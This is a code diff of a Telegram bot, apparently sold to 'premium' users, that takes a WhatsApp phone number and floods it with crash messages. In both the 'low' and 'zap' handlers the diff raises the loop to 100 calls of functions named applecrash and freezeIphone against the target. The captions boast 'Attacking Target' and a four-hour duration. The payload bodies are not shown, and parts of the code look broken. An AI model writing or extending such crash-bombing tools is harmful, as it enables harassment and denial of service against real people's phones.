@@ -1464,14 +1464,10 @@ const media = {
   }
 });
 
-//=================================================\\
-
 bot.hears(/^low\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   const userId = ctx.from.id.toString();
   const chatId = ctx.chat.id;
-  const sender = ctx.from.username
-      ? `@${ctx.from.username}`
 
   if (!q) return ctx.reply("❗ Contoh:\nLow 628xxxx");
 
@@ -1486,34 +1482,52 @@ bot.hears(/^low\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (
 
   const sentMessage = await ctx.sendPhoto(proccesImg, {
     caption: `\`\`\`
- PhenoxScary\`\`\`
- ›› Attacking ›› wa.me//${q}
- ›› Package ›› Delay Invisible 
- ›› User ›› ${sender}
- ›› ACCES SUCCES ✓
+  め | Acces Succesfully ✓\`\`\`
+  Package Bug : Delay Invisible 
+  Attacking Target : https://wa.me/${q}
+  Duration : 4Hours! 
+  Status : Proccesing 
+  Note : Tolong Di Jeda 5-10 Menit!
 `,
     parse_mode: "Markdown",
   });
+  
+  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");
 
   if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();
 
-  for (let i = 0; i < 2; i++) {
-    await DelayMakerInviss(target);
+  for (let i = 0; i < 100; i++) {
+    await applecrash(target);
+    await freezeIphone(target);
   }
   
-  console.log("\x1b[32m[BOT]\x1b[0m PhenoxScary : Send Succesfully ☀️!");
-  
+  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");
+
+  await ctx.editMessageCaption(
+    `\`\`\`
+  め | Acces Succesfully ✓\`\`\`
+  Package Bug : Delay Invisible 
+  Attacking Target : https://wa.me/${q}
+  Duration : 4Hours! 
+  Status : Succesfully 
+  Note : Tolong Di Jeda 5-10 Menit!
+
+プロセスが完了するとターゲッ
+トは1にチェックマークを付けます 
+`,
     {
       chat_id: chatId,
       message_id: sentMessage.message_id,
       parse_mode: "Markdown",
       reply_markup: {
         inline_keyboard: [
-        [{ text: "Owner", url: `t.me/RapzXyzz` }],
-      ],
-    },
-  }
+          [{ text: "Hubungi Target", url: `https://wa.me/${q}` }],
+        ],
+      },
+    }
+  );
 });
+
 
 bot.hears(/^zap\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
@@ -1533,38 +1547,54 @@ bot.hears(/^zap\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (
 
   const sentMessage = await ctx.sendPhoto(proccesImg, {
     caption: `\`\`\`
-  PhenoxScary\`\`\`
- ›› Attacking ›› wa.me//${q}
- ›› Package ›› Crash Android 
- ›› User ›› ${sender}
- ›› ACCES SUCCES ✓
+  め | Acces Succesfully ✓\`\`\`
+  Package Bug : Blank
+  Attacking Target : https://wa.me/${q}
+  Duration : 4Hours! 
+  Status : Proccesing 
+  Note : Tolong Di Jeda 5-10 Menit!
 `,
     parse_mode: "Markdown",
   });
   
-  
+  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");
+
   if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();
 
-  for (let i = 0; i < 10; i++) {
-    await PhenoxForce(target);
-    await CtaZts(target);
-    await newImage2(target);
-    await sleep(2000);
+  for (let i = 0; i < 100; i++) {
+    await applecrash(target);
+    await freezeIphone(target);
   }
   
-  console.log("\x1b[32m[BOT]\x1b[0m PhenoxScary : Successfully Send ☠️!");
-  
+  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");
+
+  await ctx.editMessageCaption(
+    `\`\`\`
+  め | Acces Succesfully ✓\`\`\`
+  Package Bug : Blank
+  Attacking Target : https://wa.me/${q}
+  Duration : 4Hours! 
+  Status : Succesfully 
+  Note : Tolong Di Jeda 5-10 Menit!
+
+プロセスが完了するとターゲッ
+トは1にチェックマークを付けます 
+`,
     {
       chat_id: chatId,
       message_id: sentMessage.message_id,
       parse_mode: "Markdown",
       reply_markup: {
         inline_keyboard: [
-        [{ text: "Owner!", url: `t.me/RapzXyzz` }],
-      ],
-    },
-  }
+          [{ text: "Hubungi Target", url: `https://wa.me/${q}` }],
+        ],
+      },
+    }
+  );
 });
+
+
+
 bot.hears(/^iosx\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   const userId = ctx.from.id.toString();
